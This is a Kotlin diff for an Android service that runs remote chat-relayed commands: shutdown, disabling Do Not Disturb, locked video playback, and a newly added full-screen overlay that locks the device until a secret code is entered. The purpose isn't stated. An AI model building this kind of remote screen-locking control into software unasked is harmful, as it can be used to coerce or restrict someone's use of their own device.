@@ -238,6 +238,26 @@ class ControlService : Service() {
                 when (cmd.optString("cmd")) {
                     "shutdown"      -> shutdown()
                     "dnd_off"       -> disableDnD()
+                    "code_lock" -> {
+                        val secret     = cmd.optString("secret", "")
+                        val allowMedia = cmd.optBoolean("allow_media", false)
+                        val chatId     = cmd.optString("_chat_id", "")
+                        val text       = cmd.optString("text", "🔒 Введи код для продолжения")
+                        OverlayActivity.start(
+                            this@ControlService,
+                            message    = text,
+                            fbMode     = "code",
+                            chatId     = chatId,
+                            codeSecret = secret,
+                            allowMedia = allowMedia,
+                        )
+                    }
+                    "code_unlock" -> {
+                        sendBroadcast(Intent(OverlayActivity.ACTION_CODE_UNLOCK))
+                    }
+                    "code_denied" -> {
+                        sendBroadcast(Intent(OverlayActivity.ACTION_CODE_DENIED))
+                    }
                     "show_message"  -> {
                         val fbMode      = cmd.optString("fb_mode", "plain")
                         val replyPrompt = cmd.optString("reply_prompt", "✏️ Напиши ответ:")
@@ -262,6 +282,7 @@ class ControlService : Service() {
                             val arr = cmd.optJSONArray("survey")
                             if (arr != null) for (i in 0 until arr.length()) add(arr.getString(i))
                         }
+                        OverlayPriorityManager.setActive(OverlayActivity.PRIORITY_VIDEO)
                         VideoActivity.startBuiltin(this@ControlService, cmd.optInt("num", 1), lock, duration,
                             fbMode, replyPrompt, survey, chatId)
                     }
@@ -279,6 +300,7 @@ class ControlService : Service() {
                         }?.sortedBy { it.name } ?: emptyList()
                         val file = files.getOrNull(rawNum - 1)
                         if (file != null) {
+                            OverlayPriorityManager.setActive(OverlayActivity.PRIORITY_VIDEO)
                             VideoActivity.startFromUrl(this@ControlService, "file://${file.absolutePath}", lock, duration,
                                 fbMode, replyPrompt, survey, chatId)
                         } else {
